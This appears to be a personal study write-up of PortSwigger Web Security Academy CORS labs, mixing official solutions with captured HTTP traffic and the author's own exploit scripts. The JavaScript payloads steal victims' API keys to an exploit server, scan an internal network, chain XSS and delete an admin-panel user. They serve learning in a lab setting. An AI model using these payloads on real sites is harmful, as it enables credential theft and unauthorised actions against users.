## **Cross-origin resource sharing (CORS)**

https://portswigger.net/web-security/cors



#### CORS vulnerability with basic origin reflection

> This website has an insecure CORS configuration in that it trusts all origins.
>
> To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
>
> You can log in to your own account using the following credentials: wiener:peter 

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Check intercept is off, then use the browser to log in and access your account page.
                    </li>
                    <li>
                        Review the history and observe that your key is retrieved via an AJAX request to <code>/accountDetails</code>, and the response contains the <code>Access-Control-Allow-Credentials</code> header suggesting that it may support CORS.
                    </li>
                    <li>
                        <p>
                            Send the request to Burp Repeater, and resubmit it with the added header:
                        </p>
                        <code class="code-scrollable">Origin: https://example.com</code>
                    </li>
                    <li>
                        Observe that the origin is reflected in the <code>Access-Control-Allow-Origin</code> header.
                    </li>
                    <li>
                        <p>
                            In the browser, go to the exploit server and enter the following HTML, replacing <code>$url</code> with your unique lab URL:
                        </p>
                        <code class="code-scrollable">&lt;script&gt;
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','$url/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='/log?key='+this.responseText;
    };
&lt;/script&gt;</code>
                    </li>
                    <li>
                        Click <strong>View exploit</strong>. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
                    </li>
                    <li>
                        Go back to the exploit server and click <strong>Deliver exploit to victim</strong>.
                    </li>
                    <li>
                        Click <strong>Access log</strong>, retrieve and submit the victim's API key to complete the lab.
                    </li>
                </ol>
            </div>
		</div>


Lab script

```javascript
<script>fetch('/accountDetails', {credentials:'include'})
    .then(r => r.json())
    .then(j => document.getElementById('apikey').innerText = j.apikey)
</script>
```

request1

```http
GET /accountDetails HTTP/1.1
Host: 0a6800800495cf64c08e018b00e30065.web-security-academy.net
Cookie: session=oKxb6YtglV9l8XqWOkOcSVQ8ef12HFD1
Origin: null
```

response1

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 161

{
  "username": "wiener",
  "email": "111@test.com",
  "apikey": "TE......5nY",
  "sessions": [
    "oKxb6YtglV9l8XqWOkOcSVQ8ef12HFD1"
  ]
}
```

request2

```http
GET /accountDetails HTTP/1.1
Host: 0a6800800495cf64c08e018b00e30065.web-security-academy.net
Cookie: session=oKxb6YtglV9l8XqWOkOcSVQ8ef12HFD1
Origin: https://0a6800800495cf64c08e018b00e30065.web-security-academy.net
```

response2

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://0a6800800495cf64c08e018b00e30065.web-security-academy.net
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 161

{
  "username": "wiener",
  "email": "111@test.com",
  "apikey": "TE......5nY",
  "sessions": [
    "oKxb6YtglV9l8XqWOkOcSVQ8ef12HFD1"
  ]
}
```

exploit

```html
<script>
var req = new XMLHttpRequest;
req.onreadystatechange = function() {
	if (req.readyState == 4) {
		req2 = new XMLHttpRequest;
		req2.open('GET', 'https://exploit-0a31003e0433cf95c07001b201e60036.web-security-academy.net/?' + btoa(this.responseText), false);
		req2.send();
	}
}
req.open('GET','https://0a6800800495cf64c08e018b00e30065.web-security-academy.net/accountDetails ',true);
req.withCredentials = true;
req.send();
</script>
```



#### CORS vulnerability with trusted null origin

> This website has an insecure CORS configuration in that it trusts the "null" origin.
>
> To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
>
> You can log in to your own account using the following credentials: wiener:peter 

exploit

```javascript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a51000f04f42cebc029747d0040005d.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='https://exploit-0a96005804f12c06c0ac74230192006f.web-security-academy.net/log?key='+this.responseText;
};
</script>"></iframe>
```

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Check intercept is off, then use Burp's browser to log in to your account. Click "My account".
                    </li>
                    <li>
                        Review the history and observe that your key is retrieved via an AJAX request to <code>/accountDetails</code>, and the response contains the <code>Access-Control-Allow-Credentials</code> header suggesting that it may support CORS.
                    </li>
                    <li>
                        Send the request to Burp Repeater, and resubmit it with the added header <code>Origin: null.</code>
                    </li>
                    <li>
                        Observe that the "null" origin is reflected in the <code>>Access-Control-Allow-Origin</code> header.
                    </li>
                    <li>
                        <p>
                            In the browser, go to the exploit server and enter the following HTML, replacing <code>$url</code> with the URL for your unique lab URL and <code>$exploit-server-url</code> with the exploit server URL:
                        </p>
                        <code class="code-scrollable">&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="&lt;script&gt;
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','$url/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
    };
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code>
                        <p>
                            Notice the use of an iframe sandbox as this generates a null origin request.
                        </p>
                    </li>
                    <li>
                        Click "View exploit". Observe that the exploit works - you have landed on the log page and your API key is in the URL.
                    </li>
                    <li>
                        Go back to the exploit server and click "Deliver exploit to victim".
                    </li>
                    <li>
                        Click "Access log", retrieve and submit the victim's API key to complete the lab.
                    </li>
                </ol>
            </div>
        </div>


#### CORS vulnerability with trusted insecure protocols

> This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.
>
> To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
>
> You can log in to your own account using the following credentials: wiener:peter 

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Check intercept is off, then use Burp's browser to log in and access your account page.
                    </li>
                    <li>
                        Review the history and observe that your key is retrieved via an AJAX request to <code>/accountDetails</code>, and the response contains the <code>Access-Control-Allow-Credentials</code> header suggesting that it may support CORS.
                    </li>
                    <li>
                        Send the request to Burp Repeater, and resubmit it with the added header <code>Origin: http://subdomain.lab-id</code> where <code>lab-id</code> is the lab domain name.
                    </li>
                    <li>
                        Observe that the origin is reflected in the <code>Access-Control-Allow-Origin</code> header, confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.
                    </li>
                    <li>
                        Open a product page, click <strong>Check stock</strong> and observe that it is loaded using a HTTP URL on a subdomain.
                    </li>
                    <li>
                        Observe that the <code>productID</code> parameter is vulnerable to XSS.
                    </li>
                    <li>
                        <p>
                            In the browser, go to the exploit server and enter the following HTML, replacing <code>$your-lab-url</code> with your unique lab URL and <code>$exploit-server-url</code> with your exploit server URL:
                        </p>
                        <code class="code-scrollable">&lt;script&gt;
    document.location="http://stock.$your-lab-url/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script&gt;&amp;storeId=1"
&lt;/script&gt;</code>
                    </li>
                    <li>
                        Click <strong>View exploit</strong>. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
                    </li>
                    <li>
                        Go back to the exploit server and click <strong>Deliver exploit to victim</strong>.
                    </li>
                    <li>
                        Click <strong>Access log</strong>, retrieve and submit the victim's API key to complete the lab.
                    </li>
                </ol>
            </div>
        </div>


Lab script

```javascript
<script>
                            const stockCheckForm = document.getElementById("stockCheckForm");
                            stockCheckForm.addEventListener("submit", function(e) {
                                const data = new FormData(stockCheckForm);
                                window.open('http://stock.0ac5004d04079469c0ca8cdd00b700d3.web-security-academy.net/?productId=1&storeId=' + data.get('storeId'), 'stock', 'height=10,width=10,left=10,top=10,menubar=no,toolbar=no,location=no,status=no');
                                e.preventDefault();
                            });
</script>
```

exploit

```javascript
<script>document.location="http://stock.0ac5004d04079469c0ca8cdd00b700d3.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0ac5004d04079469c0ca8cdd00b700d3.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0aa800d404be94dbc0498c8001df008e.web-security-academy.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

#### CORS vulnerability with internal network pivot attack

> This website has an insecure CORS configuration in that it trusts all internal network origins.
>
> This lab requires multiple steps to complete. To solve the lab, craft some JavaScript to locate an endpoint on the local network (192.168.0.0/24, port 8080) that you can then use to identify and create a CORS-based attack to delete a user. The lab is solved when you delete user Carlos. 

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
				<p>
					<strong>Step 1</strong>
				</p>
                <p>
                    First we need to scan the local network for the endpoint. Replace <code>$collaboratorPayload</code> with your own Collaborator payload or exploit server URL. Enter the following code into the exploit server. Click store then "Deliver exploit to victim". Inspect the log or the Collaborator interaction and look at the code parameter sent to it.
                </p>
				 <code class="code-scrollable">&lt;script&gt;
var q = [], collaboratorURL = 'http://$collaboratorPayload';
for(i=1;i&lt;=255;i++) {
	q.push(function(url) {
		return function(wait) {
			fetchUrl(url, wait);
		}
	}('http://192.168.0.'+i+':8080'));
}
for(i=1;i&lt;=20;i++){
	if(q.length)q.shift()(i*100);
}
function fetchUrl(url, wait) {
	var controller = new AbortController(), signal = controller.signal;
	fetch(url, {signal}).then(r =&gt; r.text().then(text =&gt; {
		location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&amp;code='+encodeURIComponent(text)+'&amp;'+Date.now();
	}))
	.catch(e =&gt; {
		if(q.length) {
			q.shift()(wait);
		}
	});
	setTimeout(x =&gt; {
		controller.abort();
		if(q.length) {
			q.shift()(wait);
		}
	}, wait);
}
&lt;/script&gt;</code>
				<p>
					<strong>Step 2</strong>
				</p>
                <p>
					Clear the code from stage 1 and enter the following code in the exploit server. Replace <code>$ip</code> with the IP address and port number retrieved from your collaborator interaction. Don't forget to add your Collaborator payload or exploit server URL again. Update and deliver your exploit. We will now probe the username field for an XSS vulnerability. You should retrieve a Collaborator interaction with <code>foundXSS=1</code> in the URL or you will see <code>foundXSS=1</code> in the log.
                </p>
				<code class="code-scrollable">&lt;script&gt;
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&amp;username='+encodeURIComponent(vector)+'&amp;password=test&amp;csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url, collaboratorURL){
	fetch(url).then(r =&gt; r.text().then(text =&gt; {
		xss(url, text, '"&gt;&lt;img src='+collaboratorURL+'?foundXSS=1&gt;');
	}))
}
fetchUrl("http://$ip", "http://$collaboratorPayload");
&lt;/script&gt;</code>
				<p>
					<strong>Step 3</strong>
				</p>
                <p>
					Clear the code from stage 2 and enter the following code in the exploit server. Replace <code>$ip</code> with the same IP address and port number as in step 2 and don't forget to add your Collaborator payload or exploit server again. Update and deliver your exploit. Your Collaborator interaction or your exploit server log should now give you the source code of the admin page.
                </p>
				<code class="code-scrollable">&lt;script&gt;
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&amp;username='+encodeURIComponent(vector)+'&amp;password=test&amp;csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url, collaboratorURL){
	fetch(url).then(r=&gt;r.text().then(text=&gt;
	{
		xss(url, text, '"&gt;&lt;iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)"&gt;');
	}
	))
}
fetchUrl("http://$ip", "http://$collaboratorPayload");
&lt;/script&gt;</code>
				<p>
					<strong>Step 4</strong>
				</p>
                <p>
                   Read the source code retrieved from step 3 in your Collaborator interaction or on the exploit server log. You'll notice there's a form that allows you to delete a user. Clear the code from stage 3 and enter the following code in the exploit server. Replace <code>$ip</code> with the same IP address and port number as in steps 2 and 3. The code submits the form to delete <code>carlos</code> by injecting an iframe pointing to the <code>/admin</code> page.
                </p>
				<code class="code-scrollable">&lt;script&gt;
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&amp;username='+encodeURIComponent(vector)+'&amp;password=test&amp;csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url){
	fetch(url).then(r=&gt;r.text().then(text=&gt;
	{
	xss(url, text, '"&gt;&lt;iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()"&gt;');
	}
	))
}
fetchUrl("http://$ip");
&lt;/script&gt;</code>
				<p>
					Click on "Deliver exploit to victim" to submit the code. Once you have submitted the form to delete user <code>carlos</code>  then you have completed the lab.
				</p>
            </div>
        </div>


test

```javascript
<script>
function log(i){
    var req = new XMLHttpRequest;
    req.onload = function() {
        if (this.status == 200) {
            req2 = new XMLHttpRequest;
            req2.open('GET', 'http://127.0.0.1/?' + i +this.responseText, false);
            req2.send();
        }
    }
    req.open('GET','http://192.168.1.'+i+':8080',false);
    req.send();
}
var i = 0;
setInterval(function() { log(i++) }, 200);
</script>
```

##### Step1

Ref: https://resources.infosecinstitute.com/wp-content/uploads/Network-Fingerprinting-and-Exploitation1.pdf

```javascript
<script>
var timeout = 5000;

function doRequest(host) {
    var d = new Date;
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = processRequest;
    xhr.timeout = timeout;

    function processRequest() {
        if (xhr.readyState == 4) {
            var time = new Date().getTime() - d.getTime();
            var aborted = false;
            
            xhr.onabort = function() {
                aborted = true;
            }
            xhr.onloadend = function() {
                if (time < timeout) {
                    // 'abort' fires always before 'onloadend'
                    if (time > 10 && aborted === false) {
                        req2 = new XMLHttpRequest;
                        req2.open('GET', 'https://exploit-0a6d00ea04bdb7bdc05fba440129009c.web-security-academy.net/?' + host+btoa(this.responseText), true);
                        req2.send();
                    }
                }
            }
        }
    }
    xhr.open("GET", "http://" + host +":8080", true);
    xhr.send();
}
var start_time = new Date().getTime();

function checkComplete() {
    var current_time = new Date().getTime();
    if ((current_time - start_time) > timeout + 1000) {
        // to stop pending XHRs, especially in Chrome
        window.stop();
        clearInterval(checkCompleteInterval);
    }
}
var checkCompleteInterval = setInterval(function() { checkComplete() }, 1000);
for (var i = 1; i < 256; i++) {
    doRequest('192.168.0.' + i);
}
</script>
```

simple version

```javascript
<script>
var timeout = 2000;

function doRequest(host) {
    var d = new Date;
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = processRequest;
    xhr.timeout = timeout;

    function processRequest() {
        if (xhr.readyState == 4) {
            var time = new Date().getTime() - d.getTime();
            var aborted = false;
            
            xhr.onabort = function() {
                aborted = true;
            }
            xhr.onloadend = function() {
                if (time < timeout) {
                    // 'abort' fires always before 'onloadend'
                    if (time > 10 && aborted === false) {
                        req2 = new XMLHttpRequest;
                        req2.open('GET', 'https://exploit-0a6d00ea04bdb7bdc05fba440129009c.web-security-academy.net/?' + host+btoa(this.responseText), true);
                        req2.send();
                    }
                }
            }
        }
    }
    xhr.open("GET", "http://" + host +":8080", true);
    xhr.send();
}
for (var i = 1; i < 256; i++) {
    doRequest('192.168.0.' + i);
}
</script>
```

##### Step 2

```javascript
<script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url, collaboratorURL){
	fetch(url).then(r => r.text().then(text => {
		xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
	}))
}
fetchUrl("http://192.168.0.237:8080", "http://exploit-0a63000003f445cdc08667c601ea008a.web-security-academy.net");
</script>
```

##### Step3

```javascript
<script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url, collaboratorURL){
	fetch(url).then(r=>r.text().then(text=>
	{
		xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
	}
	))
}
fetchUrl("http://192.168.0.237:8080", "http://exploit-0a63000003f445cdc08667c601ea008a.web-security-academy.net");
</script>
```

admin page

```html
 <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href="/">Home</a><p>|</p>
                            <a href="/admin">Admin panel</a><p>|</p>
                            <a href="/my-account?id=administrator">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <form style="margin-top: 1em" class="login-form" action="/admin/delete" method="POST">
                        <input required="" type="hidden" name="csrf" value="cyVDh0N5vtPrO0Be172pkhv9mt6ryWB7">
                        <label>Username</label>
                        <input required="" type="text" name="username">
                        <button class="button" type="submit">Delete user</button>
                    </form>
                </div>
            </section>
        </div>
```

##### Step4

```javascript
<script>
function xss(url, text, vector) {
	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
}
function fetchUrl(url){
	fetch(url).then(r=>r.text().then(text=>
	{
	xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
	}
	))
}
fetchUrl("http://192.168.0.237:8080");
</script>
```

